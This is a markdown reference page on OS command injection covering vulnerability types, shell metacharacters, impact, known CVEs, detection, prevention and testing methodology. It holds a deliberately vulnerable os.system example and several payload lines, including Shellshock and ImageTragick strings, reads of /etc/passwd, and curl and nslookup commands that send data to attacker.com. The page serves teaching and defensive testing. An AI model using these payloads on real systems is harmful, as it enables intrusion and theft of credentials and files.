# Remote Code Execution (RCE) - Command Injection

## Overview

Command Injection (also known as OS Command Injection or Shell Injection) is a critical security vulnerability that allows attackers to execute arbitrary operating system commands on the server hosting an application. This vulnerability occurs when an application passes unsafe user-supplied data (forms, cookies, HTTP headers, etc.) to a system shell without proper validation or sanitization.

## What is Command Injection?

Command Injection vulnerabilities arise when:
1. An application executes system commands
2. User input is incorporated into these commands
3. Input is not properly validated, sanitized, or escaped
4. Attackers can inject malicious commands that get executed by the system shell

### How It Works

When an application needs to interact with the operating system (e.g., to ping a server, process files, or run utilities), it may construct shell commands using user input. If this input isn't properly handled, attackers can inject additional commands using shell metacharacters:

**Vulnerable Code Example (Python):**
```python
import os

# Vulnerable: User input directly concatenated into system command
user_input = request.GET['ip']
os.system(f"ping -c 4 {user_input}")
```

**Attack Example:**
```
Input: 8.8.8.8; cat /etc/passwd
Executed: ping -c 4 8.8.8.8; cat /etc/passwd
```

## Types of Command Injection

### 1. **In-Band (Results Visible)**
The output of injected commands is directly returned in the application response.

**Example:**
```bash
Input: 127.0.0.1 && whoami
Output: 
PING 127.0.0.1...
64 bytes from 127.0.0.1...
www-data
```

### 2. **Blind (No Direct Output)**
Injected commands execute successfully but output isn't visible in the response.

**Detection Methods:**
- Time delays: `; sleep 10`
- Out-of-band data exfiltration: `; curl http://attacker.com/$(whoami)`
- File system modifications: `; touch /tmp/pwned`

### 3. **Out-of-Band**
Data is exfiltrated through external channels (DNS, HTTP, ICMP).

**Example:**
```bash
; nslookup $(whoami).attacker.com
; curl http://attacker.com/exfil?data=$(cat /etc/passwd | base64)
```

## Common Injection Points

### 1. **Network Utilities**
- Ping commands
- Traceroute
- Nslookup/dig
- Whois lookups

### 2. **File Operations**
- File uploads/downloads
- Image processing
- PDF generation
- Archive extraction

### 3. **System Information**
- System diagnostics
- Log viewers
- Backup utilities
- Report generators

### 4. **External Integrations**
- Email sending
- Video/audio conversion
- Document conversion
- Data exports

## Command Separators & Metacharacters

### Unix/Linux:
```bash
;   # Command separator (sequential execution)
&   # Background execution
&&  # Execute if previous succeeds
||  # Execute if previous fails
|   # Pipe output to next command
`   # Command substitution (backticks)
$() # Command substitution (modern)
\n  # Newline (can act as separator)
```

### Windows:
```cmd
&   # Command separator
&&  # Execute if previous succeeds
||  # Execute if previous fails
|   # Pipe output
;   # Limited use in Windows
%VAR% # Environment variable
```

## Impact & Risk

### Critical Impact:
- **Complete System Compromise**: Full control over the server
- **Data Breach**: Access to sensitive files, databases, credentials
- **Lateral Movement**: Pivot to internal networks
- **Service Disruption**: Denial of service, data destruction
- **Malware Installation**: Backdoors, ransomware, cryptominers
- **Privilege Escalation**: Elevation to root/administrator

### CVSS Considerations:
- **Base Score**: Typically 9.0-10.0 (Critical)
- **Attack Vector**: Network
- **Attack Complexity**: Low
- **Privileges Required**: None to Low
- **User Interaction**: None
- **Impact**: Complete CIA triad compromise

## Real-World Examples

### Example 1: Shellshock (CVE-2014-6271)
Bash vulnerability allowing command injection through environment variables.
```bash
() { :; }; /bin/bash -c 'cat /etc/passwd'
```

### Example 2: ImageTragick (CVE-2016-3714)
ImageMagick command injection via malicious image files.
```bash
push graphic-context
viewbox 0 0 640 480
fill 'url(https://example.com/image.jpg"|whoami")'
pop graphic-context
```

### Example 3: Log4Shell (CVE-2021-44228)
While primarily JNDI injection, it demonstrates similar remote code execution concepts.

## Detection Indicators

### Application Behavior:
- Unusually long response times
- Error messages revealing system details
- Unexpected network connections
- File system modifications
- Process creation anomalies

### Code Review Red Flags:
```python
# Python
os.system(), os.popen(), subprocess.call(), eval(), exec()

# PHP  
system(), exec(), shell_exec(), passthru(), proc_open()

# Java
Runtime.exec(), ProcessBuilder()

# Node.js
child_process.exec(), eval()

# Ruby
system(), exec(), %x[], backticks
```

## Prevention Best Practices

### 1. **Avoid System Commands**
Use language-specific libraries instead of shell commands:
```python
# Instead of: os.system(f"ping {host}")
# Use: socket library or native network functions
import socket
socket.gethostbyname(host)
```

### 2. **Input Validation**
- Whitelist allowed characters
- Validate against strict patterns
- Reject metacharacters
```python
import re
if not re.match(r'^[a-zA-Z0-9.\-]+$', user_input):
    raise ValueError("Invalid input")
```

### 3. **Use Safe APIs**
```python
# Use array-based arguments (prevents shell interpretation)
import subprocess
subprocess.run(["ping", "-c", "4", user_input], shell=False)
```

### 4. **Principle of Least Privilege**
- Run application with minimal permissions
- Use dedicated service accounts
- Implement OS-level restrictions (SELinux, AppArmor)

### 5. **Input Sanitization**
```python
import shlex
safe_input = shlex.quote(user_input)  # Escapes shell metacharacters
```

## Testing Methodology

### 1. **Identify Injection Points**
- Map all user input fields
- Test parameters, headers, cookies
- Analyze application functionality

### 2. **Test Command Separators**
```bash
# Try different separators
; whoami
& whoami  
&& whoami
|| whoami
| whoami
`whoami`
$(whoami)
```

### 3. **Blind Testing Techniques**
```bash
# Time-based detection
; sleep 10
& timeout 10

# Out-of-band (OOB) detection
; curl http://burpcollaborator.net
; nslookup attacker.com
```

### 4. **Encoding Techniques**
```bash
# URL encoding
%3B%20whoami

# Double encoding
%253B%2520whoami

# Unicode
\u003b whoami
```

## Tools & Resources

### Testing Tools:
- **Burp Suite**: Intruder, Repeater for injection testing
- **Commix**: Automated command injection exploitation
- **OWASP ZAP**: Active scanner with injection detection
- **SQLMap**: Can detect and exploit command injection
- **Metasploit**: Various command injection modules

### Payloads & Wordlists:
- SecLists: Command injection payloads
- PayloadsAllTheThings: Comprehensive injection examples
- OWASP Testing Guide: Command injection methodology

### Detection Scripts:
```bash
# Simple detection script
for sep in ";" "&" "&&" "|" "||" "\`" "$()" "%0a"; do
    payload="127.0.0.1${sep}whoami"
    echo "Testing: $payload"
    # Send payload and analyze response
done
```

## Further Reading

- [OWASP Command Injection](https://owasp.org/www-community/attacks/Command_Injection)
- [CWE-77: Command Injection](https://cwe.mitre.org/data/definitions/77.html)
- [CWE-78: OS Command Injection](https://cwe.mitre.org/data/definitions/78.html)
- [PortSwigger: OS Command Injection](https://portswigger.net/web-security/os-command-injection)
- [HackerOne Command Injection Reports](https://hackerone.com/hacktivity?querystring=command%20injection)

## Related Vulnerabilities

- **Code Injection**: Direct code execution in application runtime
- **SQL Injection**: Command injection in database context
- **LDAP Injection**: Command injection in directory services
- **XML Injection**: Command injection via XML processing
- **Server-Side Template Injection (SSTI)**: Code execution via templates

## Compliance & Standards

- **OWASP Top 10 2021**: A03:2021 - Injection
- **PCI DSS**: Requirement 6.5.1 - Injection flaws
- **SANS Top 25**: CWE-78 (OS Command Injection)
- **ISO 27001**: A.14.2.5 - Secure system engineering principles

---

**See Also:**
- [Payloads.md](./Payloads.md) - Comprehensive payload collection for bash/cmd/PowerShell
- [Remediation.md](./Remediation.md) - Detailed fix strategies and secure coding practices
- [Reproduce.md](./Reproduce.md) - Step-by-step attack reproduction guides
- [BurpSuite-Guide.md](./BurpSuite-Guide.md) - Hands-on Burp Suite testing workflow
